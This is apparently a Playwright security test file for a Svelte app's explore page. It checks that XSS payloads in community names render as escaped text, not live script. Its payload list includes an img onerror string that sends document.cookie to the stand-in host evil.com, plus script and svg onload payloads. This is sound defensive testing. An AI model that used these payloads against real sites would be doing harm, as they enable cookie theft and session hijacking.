/**
 * Codex Security Report — Section 3.4
 * Feature: Cross-Site Scripting (XSS) and Payload Neutralization
 *
 * Injects obfuscated script payloads via the explore community names endpoint
 * and verifies that Svelte's auto-escaping renders them as raw, inert text
 * rather than live DOM nodes.  A route interceptor on the exfiltration target
 * (evil.com) acts as a tripwire: any fetch triggered by an un-neutralized
 * payload will set xssFetchMade=true and fail the test.
 *
 * @security @xss @gui-execution
 */

import { test, expect } from '@playwright/test';
import { buildMockAuthData, buildMockDevice, mockAuthEndpoints, setInstallationId } from './auth-helper.js';
import { mockExploreEndpoints } from './helpers/mock-routes.js';
import { log } from './helpers/log.js';

/** Payloads covering the most common XSS vectors. */
const XSS_PAYLOADS = [
	'<img src=x onerror="fetch(\'http://evil.com/?cookie=\' + document.cookie)">',
	'<script>fetch("http://evil.com/?xss=1")</script>',
	'<svg onload="window.__xss_fired=true">',
];

async function setupAuthAndExplore(
	page: Parameters<typeof mockAuthEndpoints>[0],
	communityNames: string[],
): Promise<void> {
	const device = buildMockDevice({ installation_id: 'xss-test-install' });
	const authData = buildMockAuthData({ device });
	await setInstallationId(page, 'xss-test-install');
	await mockAuthEndpoints(page, authData);

	await page.route('**/api/v1/servers', async (route) => {
		await route.fulfill({ status: 200, contentType: 'application/json', body: '[]' });
	});
	await page.route('**/api/v1/conversations', async (route) => {
		await route.fulfill({ status: 200, contentType: 'application/json', body: '[]' });
	});

	await mockExploreEndpoints(page, {
		communities: communityNames.map((name, i) => ({
			id: `xss-community-${i}`,
			name,
			memberCount: 1,
		})),
		searchUsers: [
			{
				id: 'xss-user-1',
				username: 'xss_test_user',
				displayName: XSS_PAYLOADS[0],
			},
		],
	});
}

test.describe('XSS payload neutralization @security @xss @gui-execution', () => {
	test('obfuscated script payloads in community names render as escaped text @smoke', async ({ page }) => {
		// Tripwire: if any XSS payload executes and fetches evil.com, the test fails.
		let xssFetchMade = false;
		await page.route('**evil.com**', async (route) => {
			xssFetchMade = true;
			log('SECURITY', 'XSS_TRIPWIRE', `ALERT — exfiltration request intercepted: ${route.request().url()}`);
			await route.abort();
		});

		// Monitor for runtime errors that could indicate XSS execution.
		const consoleErrors: string[] = [];
		page.on('console', (msg) => {
			if (msg.type() === 'error') consoleErrors.push(msg.text());
		});

		log('XSS', 'SETUP', `Injecting ${XSS_PAYLOADS.length} XSS payloads into explore community names`);
		await setupAuthAndExplore(page, XSS_PAYLOADS);

		log('NETWORK', 'NAVIGATE', 'Loading /explore with adversarial community name data');
		await page.goto('/explore');
		await expect(page.locator('[aria-label="Loading Yapper"]')).toHaveCount(0, { timeout: 30_000 });

		// Give any async onerror / onload handlers a full render cycle to fire.
		await page.waitForTimeout(500);

		// ── Assertion 1: No live DOM injection ────────────────────────────────────
		log('ASSERTION', 'DOM', 'Checking that no <img onerror> nodes were injected into the DOM');
		await expect(page.locator('img[onerror]')).toHaveCount(0);

		log('ASSERTION', 'DOM', 'Checking that no <svg onload> nodes were injected into the DOM');
		await expect(page.locator('svg[onload]')).toHaveCount(0);

		// ── Assertion 2: Payload visible as literal text (Svelte auto-escape) ─────
		// Svelte renders {value} as escaped text content, not raw HTML.
		// A substring of the first payload should be visible as text.
		log('ASSERTION', 'UI', 'Verifying payload is rendered as literal escaped text, not HTML');
		const payloadFragment = 'img src=x onerror';
		const escapedTextLocator = page.locator(`text=<${payloadFragment}`);

		// At least one occurrence of the raw escaped text must be visible.
		const count = await escapedTextLocator.count();
		expect(count).toBeGreaterThan(0);
		log('ASSERTION', 'UI', `Escaped text "<${payloadFragment}" found ${count} time(s) in DOM. [PASS]`);

		// ── Assertion 3: No exfiltration request to evil.com ─────────────────────
		expect(xssFetchMade).toBe(false);
		log('VALIDATION', 'SECURITY', 'No exfiltration requests to evil.com detected. [PASS]');

		// ── Assertion 4: window.__xss_fired flag not set ──────────────────────────
		const xssFired = await page.evaluate(() => (window as unknown as Record<string, unknown>).__xss_fired);
		expect(xssFired).toBeFalsy();
		log('VALIDATION', 'SECURITY', 'window.__xss_fired is falsy — SVG onload did not execute. [PASS]');

		// ── Assertion 5: No unexpected JS errors ─────────────────────────────────
		const xssErrors = consoleErrors.filter(
			(e) => e.includes('evil.com') || e.includes('onerror') || e.includes('__xss'),
		);
		expect(xssErrors).toHaveLength(0);
		log('VALIDATION', 'SECURITY', `Zero XSS-related console errors recorded. [PASS]`);
	});
});
